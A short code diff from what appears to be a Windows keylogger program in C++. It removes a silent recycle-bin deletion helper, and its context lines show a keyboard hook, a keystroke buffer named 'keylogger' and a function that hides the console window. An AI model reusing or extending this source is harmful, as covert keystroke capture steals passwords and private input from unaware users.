@@ -7,22 +7,6 @@
 HHOOK eHook = NULL;
 std::string keylogger = "";
 
-
-
-bool move_to_recycle_bin(const std::string& filePath) {
-    SHFILEOPSTRUCTA fileOp = {0};
-    char path[MAX_PATH + 1] = {0};
-    strncpy_s(path, filePath.c_str(), MAX_PATH);
-    path[filePath.length() + 1] = '\0'; // Double null-terminate
-
-    fileOp.wFunc = FO_DELETE;
-    fileOp.pFrom = path;
-    fileOp.fFlags = FOF_ALLOWUNDO | FOF_SILENT | FOF_NOERRORUI;
-
-    return (SHFileOperationA(&fileOp) == 0);
-}
-
-
 void hide_console() {
     HWND stealth;
     AllocConsole();
